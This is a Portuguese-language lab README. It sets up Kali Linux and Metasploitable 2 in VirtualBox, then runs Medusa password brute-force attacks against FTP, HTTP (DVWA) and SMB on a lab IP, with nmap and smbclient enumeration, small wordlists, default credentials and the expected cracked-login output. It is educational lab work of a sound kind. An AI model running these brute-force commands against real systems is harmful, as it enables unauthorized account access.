# Simulação de Bruteforce com Meduda

![Linux Security](https://img.shields.io/badge/Linux-Cibersegurança-black?style=for-the-badge&logo=linux)
![NotebookLM](https://img.shields.io/badge/Meduna-BruteForce-blue?style=for-the-badge)
![Status](https://img.shields.io/badge/Status-Em%20Desenvolvimento-green?style=for-the-badge)

# Instalação do Ambiente do Laboratório

Este guia documenta o processo completo de preparação do ambiente utilizado no desafio de força bruta com Medusa.

O laboratório será composto por:

* Kali Linux
* Metasploitable 2
* VirtualBox

---

# Objetivo do Ambiente

O objetivo deste laboratório é criar um ambiente controlado para:

* realizar testes de força bruta;
* utilizar ferramentas de auditoria de segurança;
* praticar enumeração de serviços;
* compreender vulnerabilidades comuns em FTP, HTTP e SMB.

---

# Instalação do VirtualBox

## Download do VirtualBox

Acesse o site oficial:

[https://www.virtualbox.org/](https://www.virtualbox.org/)

## Download para Linux

Na página inicial:

1. Clique em Downloads;
2. Escolha a versão compatível com seu sistema operacional;
3. Baixe o pacote correspondente.

---

# Instalação do VirtualBox no Linux

## Debian/Ubuntu/Kali

Após baixar o arquivo:

```bash
sudo dpkg -i virtualbox-*.deb
```

## Corrigindo dependências

```bash
sudo apt --fix-broken install -y
```

## Verificando instalação

```bash
virtualbox
```

---

# Download do Kali Linux para VirtualBox

## Site oficial

[https://www.kali.org/get-kali/](https://www.kali.org/get-kali/)

## Escolhendo imagem pronta para VirtualBox

1. Acesse:

```text
Virtual Machines
```

2. Baixe:

```text
Kali Linux VirtualBox Image
```

O arquivo geralmente vem compactado em:

```text
.7z
```

---

# Extraindo o Kali Linux

## Instalando o 7zip

```bash
sudo apt install p7zip-full -y
```

## Extraindo arquivo

```bash
7z x kali-linux-*.7z
```

---

# Importando Kali Linux no VirtualBox

## Abrindo VirtualBox

```bash
virtualbox
```

## Adicionando máquina virtual

1. Clique em:

```text
Machine → Add
```

2. Selecione o arquivo:

```text
.vbox
```

3. Clique em:

```text
Open
```

A máquina Kali Linux aparecerá automaticamente.

---

# Iniciando Kali Linux

1. Selecione a VM;
2. Clique em Start.

## Credenciais padrão

```text
Usuário: kali
Senha: kali
```

---

# Atualizando Kali Linux (opcional)

Após iniciar:

```bash
sudo apt update && sudo apt upgrade -y
```
---

# Download do Metasploitable 2

## Site oficial

[https://sourceforge.net/projects/metasploitable/](https://sourceforge.net/projects/metasploitable/)

## Arquivo esperado

```text
metasploitable-linux-2.0.0.zip
```

---

# Extraindo Metasploitable 2

## Instalando unzip

```bash
sudo apt install unzip -y
```

## Extraindo arquivo

```bash
unzip metasploitable-linux-2.0.0.zip
```

---

# Criando VM do Metasploitable 2 no VirtualBox

## Abrindo VirtualBox

```bash
virtualbox
```

## Criando nova máquina

1. Clique em:

```text
New
```

2. Nome:

```text
Metasploitable2
```

3. Tipo:

```text
Linux
```

4. Versão:

```text
Ubuntu (32-bit)
```

---

# Configuração de Memória

Recomendado:

```text
512 MB ou 1024 MB
```

---

# Configuração do Disco

## Utilizar disco existente

Selecione:

```text
Use an existing virtual hard disk file
```

## Selecionar arquivo baixado

Escolha o arquivo:

```text
Metasploitable.vmdk
```

Depois clique em:

```text
Create
```

---

# Configuração de Rede das Máquinas

## Objetivo

Permitir comunicação entre:

* Kali Linux;
* Metasploitable 2.

---

# Configurando Rede no VirtualBox

## Em ambas as VMs

1. Clique em:

```text
Settings → Network
```

2. Em Adapter 1:

Escolha:

```text
Host-Only Adapter
```

---

# Iniciando Metasploitable 2

1. Selecione VM;
2. Clique em Start.

---

# Login no Metasploitable 2

## Credenciais padrão

```text
Usuário: msfadmin
Senha: msfadmin
```

---

# Descobrindo IP do Metasploitable

No terminal:

```bash
ifconfig
```

ou

```bash
ip a
```

Retorno esperado:

![ip-metasploitable](https://github.com/UchoaFilho/simulacao-bruteforce-kali-medusa/blob/main/images/ip-metasploitable.png?raw=true)

---

# Testando Comunicação

No Kali Linux:

![ping-teste](https://github.com/UchoaFilho/simulacao-bruteforce-kali-medusa/blob/main/images/ping-teste.png?raw=true)

---

# Descobrindo Serviços Ativos

## Scan com Nmap

```bash
nmap -sV 192.168.56.102
```

## Resultado esperado

![nmap-scan](https://github.com/UchoaFilho/simulacao-bruteforce-kali-medusa/blob/main/images/nmap-scan.png?raw=true)

---

# Script Auxiliar para Geração de Wordlists

Foi desenvolvido um script simples em Python para automatizar a geração de combinações de usuários e senhas para visualização das combinações testada peça medusa.

## Execução

```bash
python3 gerar_wordlist.py
```

## Exemplo de saída

```text
user:123456
user:password
msfadmin:password
```
---


# Ataque de Força Bruta FTP com Medusa

Após a enumeração de serviços utilizando Nmap, foi identificado o serviço FTP ativo na máquina Metasploitable 2.

## Serviço identificado

```text
21/tcp open ftp
```

O serviço FTP foi utilizado para demonstração de ataque de força bruta em ambiente controlado.

---

# Objetivo

Demonstrar como credenciais fracas podem comprometer serviços expostos na rede através de ataques automatizados utilizando a ferramenta Medusa.

---

# Wordlists Utilizadas

## Arquivo de usuários

```text
wordlists/users.txt
```

Conteúdo:

```text
user
msfadmin
admin
root
```

---

## Arquivo de senhas

```text
wordlists/passwords.txt
```

Conteúdo:

```text
123456
password
qwerty
msfadmin
```

---

# Execução do Medusa

## Comando utilizado

```bash
medusa -h 192.168.56.102 -U wordlists/users.txt -P wordlists/passwords.txt -M ftp
```

---

# Explicação dos Parâmetros

| Parâmetro | Função |
|---|---|
| -h | endereço IP do alvo |
| -U | arquivo contendo usuários |
| -P | arquivo contendo senhas |
| -M ftp | módulo FTP do Medusa |

---

# Resultado Esperado

Durante a execução o Medusa realiza múltiplas tentativas de autenticação combinando usuários e senhas automaticamente.

Saída esperada:

```text
ACCOUNT FOUND: [ftp] Host: 192.168.56.102 User: msfadmin Password: msfadmin
```

---

# Vulnerabilidade Identificada

Foi identificada vulnerabilidade relacionada ao uso de credenciais fracas no serviço FTP.

## Impactos possíveis

- acesso não autorizado;
- comprometimento de arquivos;
- movimentação lateral na rede;
- exposição de informações sensíveis.

---

# Evidências

As capturas de tela desta etapa foram armazenadas na pasta:

```text
/images
```

---

# Capturas Recomendadas

## Execução do Medusa

![Comando-medusa-ataque-ftp](https://github.com/UchoaFilho/simulacao-bruteforce-kali-medusa/blob/main/images/Comando-medusa-ataque-ftp.png?raw=true)

---

## Credencial encontrada

![Resultado-ataque-ftp](https://github.com/UchoaFilho/simulacao-bruteforce-kali-medusa/blob/main/images/Resultado-ataque-ftp.png?raw=true)

---

## Serviço FTP identificado pelo Nmap

![acesso-ftp-usuario-senha-medusa](https://github.com/UchoaFilho/simulacao-bruteforce-kali-medusa/blob/main/images/acesso-ftp-usuario-senha-medusa.png?raw=true)

---

# Arquivos Relacionados

## Wordlists

```text
wordlists/users.txt
wordlists/passwords.txt
```

---

## Comandos utilizados

```text
comandos/comandos-utilizados.txt
```

---

# Teste de Autenticação HTTP com Medusa

Durante a enumeração de serviços utilizando Nmap foi identificado o serviço HTTP ativo na máquina Metasploitable 2.

## Serviço identificado

```text
80/tcp open http
```

O ambiente Metasploitable 2 possui aplicações web vulneráveis utilizadas para estudos de segurança em ambiente controlado.

---

# Objetivo

Demonstrar testes básicos de autenticação HTTP utilizando a ferramenta Medusa para compreensão de ataques de força bruta em aplicações web.

---

# Verificando Serviço HTTP

Foi realizado acesso ao serviço HTTP através do navegador do Kali Linux.

## URL acessada

```text
http://192.168.56.102
```

---

# Aplicação Vulnerável Identificada

Durante os testes foi identificada a aplicação:

```text
DVWA (Damn Vulnerable Web Application)
```

A aplicação é utilizada para treinamento e demonstração de vulnerabilidades web.

---

# Wordlists Utilizadas

## Arquivo de usuários

Arquivo:

```text
wordlists/users.txt
```

Conteúdo:

```text
admin
msfadmin
admin
root
```

---

## Arquivo de senhas

Arquivo:

```text
wordlists/passwords.txt
```

Conteúdo:

```text
123456
password
qwerty
msfadmin
```

---

# Teste HTTP com Medusa

Foi realizada tentativa de autenticação automatizada utilizando o módulo HTTP do Medusa.

## Comando utilizado

```bash
medusa -h 192.168.56.102 -U wordlists/users.txt -P wordlists/passwords.txt -M http
```

---

# Explicação dos Parâmetros

| Parâmetro | Função |
|---|---|
| -h | endereço IP do alvo |
| -U | lista de usuários |
| -P | lista de senhas |
| -M http | módulo HTTP do Medusa |

---

# Observações Técnicas

Durante os testes foi observado que aplicações web modernas utilizam mecanismos adicionais de autenticação, incluindo:

- formulários HTML;
- método POST;
- cookies de sessão;
- tokens CSRF;
- autenticação dinâmica.

Por esse motivo, o módulo HTTP básico do Medusa possui limitações para autenticação automatizada em aplicações web como o DVWA.

---

# Análise do Formulário Web

Durante a análise da aplicação foram identificados parâmetros utilizados no processo de autenticação.

## Exemplo de parâmetros observados

```text
username
password
Login
```

---

# Exemplo Conceitual de Requisição HTTP

```http
POST /dvwa/login.php HTTP/1.1

username=admin&password=password&Login=Login
```

---

# Resultado Observado

O teste permitiu compreender:

- funcionamento de autenticação HTTP;
- utilização de wordlists;
- funcionamento do Medusa;
- diferenças entre autenticação de serviços e aplicações web.

---

# Vulnerabilidade Identificada

A aplicação apresentou vulnerabilidades relacionadas a:

- uso de credenciais fracas;
- autenticação insegura;
- ausência de limitação de tentativas;
- ambiente vulnerável para estudos.

---

# Possíveis Impactos

- acesso não autorizado;
- comprometimento de contas;
- exposição de informações;
- escalonamento de privilégios.

---

# Evidências

As capturas de tela desta etapa foram armazenadas em:

```text
/images
```

---

## Execução do Medusa HTTP

![medusa-http](https://github.com/UchoaFilho/simulacao-bruteforce-kali-medusa/blob/main/images/medusa-http.png?raw=true)

---

---

# Teste de Segurança SMB com Medusa

Durante a enumeração de serviços foi identificado o serviço SMB ativo na máquina Metasploitable 2.

## Serviço identificado

```text
445/tcp open microsoft-ds
```

O SMB (Server Message Block) é utilizado para compartilhamento de arquivos e autenticação em rede.

---

# Objetivo

Demonstrar testes básicos de autenticação em serviços SMB utilizando Medusa em ambiente controlado.

---

# Verificando Compartilhamentos SMB

Foi utilizado o smbclient para identificar compartilhamentos disponíveis no alvo.

## Comando utilizado

```bash
smbclient -L //192.168.56.102 -N
```

---

# Explicação do comando

| Parâmetro | Função |
|---|---|
| smbclient | cliente SMB |
| -L | lista compartilhamentos |
| //192.168.56.102 | endereço do alvo |
| -N | conexão sem senha |

---

# Resultado Esperado

Exemplo:

```text
Sharename       Type
tmp             Disk
opt             Disk
IPC$            IPC
```

---

# Ataque de Força Bruta SMB com Medusa

Após identificar o serviço SMB, foi realizado teste de autenticação automatizada utilizando Medusa.

---

# Wordlists Utilizadas

## Usuários

Arquivo:

```text
wordlists/users.txt
```

Conteúdo:

```text
admin
msfadmin
admin
root
```

---

## Senhas

Arquivo:

```text
wordlists/passwords.txt
```

Conteúdo:

```text
123456
password
qwerty
msfadmin
```

---

# Comando Utilizado

```bash
medusa -h 192.168.56.102 -U ~/users.txt -P ~/passwords.txt -M smbnt
```

---

# Explicação dos Parâmetros

| Parâmetro | Função |
|---|---|
| -h | IP do alvo |
| -U | lista de usuários |
| -P | lista de senhas |
| -M smbnt | módulo SMB do Medusa |

---

# Resultado Esperado

Exemplo de credencial encontrada:

```text
ACCOUNT FOUND: [smbnt] Host: 192.168.56.102 User: msfadmin Password: msfadmin
```

---

# Vulnerabilidade Identificada

O serviço SMB apresentou vulnerabilidade relacionada ao uso de credenciais fracas e autenticação insegura.

---

# Possíveis Impactos

- acesso indevido a compartilhamentos;
- vazamento de arquivos;
- movimentação lateral na rede;
- comprometimento de sistemas internos.

---

# Evidências

As capturas de tela desta etapa foram armazenadas na pasta:

```text
/images
```

---

# Capturas

## Compartilhamentos SMB encontrados

![medusa-sambaa](https://github.com/UchoaFilho/simulacao-bruteforce-kali-medusa/blob/main/images/medusa-samba.png?raw=true)

---

## Execução do Medusa SMB

![Comando-medusa-ataque-samba](https://github.com/UchoaFilho/simulacao-bruteforce-kali-medusa/blob/main/images/Comando-medusa-ataque-samba.png?raw=true)

--- 

## Credencial SMB encontrada

![acesso-samba-usuario-senha-medusa](https://github.com/UchoaFilho/simulacao-bruteforce-kali-medusa/blob/main/images/acesso-samba-usuario-senha-medusa.png?raw=true)

---

# Comandos Relacionados

## Enumeração SMB

```bash
smbclient -L //192.168.56.102 -N
```

---

## Teste de autenticação SMB

```bash
medusa -h 192.168.56.102 -U wordlists/users.txt -P wordlists/passwords.txt -M smbnt
```

---

# Medidas de Mitigação

Para reduzir riscos relacionados ao SMB:

- utilização de senhas fortes;
- desativação do SMBv1;
- restrição de acesso por firewall;
- segmentação de rede;
- autenticação multifator;
- monitoramento de tentativas de login.

---

# Considerações Éticas

Todos os testes realizados ocorreram exclusivamente em ambiente controlado e autorizado para fins educacionais.
